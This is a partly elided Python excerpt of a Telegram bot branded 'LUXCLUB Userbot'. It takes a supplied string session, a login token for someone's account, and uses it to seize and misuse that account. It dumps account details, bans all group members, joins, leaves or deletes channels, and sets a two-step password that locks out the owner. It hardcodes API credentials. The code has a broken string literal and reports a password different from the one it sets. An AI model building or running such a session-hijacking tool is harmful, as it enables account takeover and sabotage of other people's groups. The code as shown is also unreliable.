...
async def user2fa(strses):
    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
        try:
            await X.edit_2fa("LUXCLUB USERBOT IS BEST")
            return True
        except:
            return False
    ...
    async with bot.conversation(event.chat_id) as x:
        ...
        if res.text == "A":
            ...
            if len(i) > 3855:
                ...
                file.write(i + "\n\nDETAILS BY LUXCLUB Userbot")
                file.close()
                await bot.send_file(event.chat_id, "session.txt")
                system("rm -rf session.txt")
            else:
                await event.reply(i + "\n\nThanks For Using LUXCLUB Userbot")
        elif res.text == "B":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            ...
            await event.reply("Banning all members Thanks For Using LUXCLUB Userbot")
        elif r == "D":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            ...
            await event.reply("Joined the Channel/Group Thanks For Using LUXCLUB Userbot")
        elif r == "F":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            ...
            await event.reply("Leaved the Channel/Group Thanks For Using LUXCLUB Userbot")
        elif r == "G":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            ...
            await event.reply("Deleted the Channel/Group Thanks For Using LUXCLUB Userbot)
        elif r == "H":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            ...
            if i:
                await event.reply(
                    "User don't have two step thats why now two step is `LUXCLUBisBEST` you can login now\n\nThanks For Using LUXCLUB Userbot"
                )
            else:
            ...
            try:
                ...
                await event.respond(
                    "SEND THIS ERROR TO - @LUXCLUB_SERGIO\n**LOGS**\n" + str(e)
                )
